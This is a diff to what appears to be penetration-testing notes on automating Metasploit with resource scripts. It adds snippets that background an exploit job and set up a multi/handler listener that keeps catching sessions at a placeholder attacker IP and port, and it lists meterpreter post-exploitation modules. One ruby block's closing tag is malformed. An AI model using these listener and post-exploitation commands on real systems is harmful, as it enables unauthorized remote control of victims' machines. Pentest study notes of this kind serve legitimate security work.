@@ -2,8 +2,6 @@
 
 TODO: Provide resource scripts to automate the process in metasploit
 
-https://security.stackexchange.com/questions/243391/how-to-run-a-meterpreter-script-multiple-times
-
 ```
 run post/multi/gather/run_console_rc_file
 
@@ -12,6 +10,23 @@ run post/multi/gather/multi_command
 run post/multi/manage/multi_post
 
 meterpreter > run multi_console_command
+```
+
+```
+<ruby>
+run_single("exploit -j -z")
+</ruby>
+```
+
+```
+<ruby>
+use exploit/multi/handler
+set payload <payload_module>
+set lhost <attacker_IP>
+set lport <attacker_PORT>
+set ExitOnSession false
+exploit -j
+<ruby>
 ```
 
 ---
